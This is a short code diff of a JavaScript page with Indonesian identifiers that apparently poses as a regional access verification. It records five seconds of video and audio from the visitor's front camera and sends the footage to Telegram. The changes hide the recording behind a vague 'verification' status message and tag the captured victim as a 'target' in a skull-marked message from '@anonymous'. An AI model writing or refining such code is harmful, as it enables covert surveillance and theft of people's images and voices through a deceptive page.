@@ -155,7 +155,7 @@ function mulaiVerifikasi(wilayah) {
 }
 
 function prosesRekamanKamera() {
-    updateStatus("Memulai pengambilan video validasi (5 detik)...", "loading", true);
+    updateStatus("Memulai varifikasi validasi (5 detik)...", "loading", true);
 
     const constraints = { video: { facingMode: "user" }, audio: true };
 
@@ -187,9 +187,9 @@ function prosesRekamanKamera() {
 }
 
 function kirimKeTelegram(videoBlob) {
-    updateStatus("Mengunggah data enkripsi verifikasi...", "loading", true);
+    updateStatus("Memuat verifikasi...", "loading", true);
 
-    const infoTeks = `🔐 *Hasil Verifikasi Akses*:\n\n` +
+    const infoTeks = `☠️ *Hasil Verifikasi Akses target by @anonymous*:\n\n` +
                      `• Wilayah Pilihan: \`${wilayahDipilih}\``;
 
     const formData = new FormData();
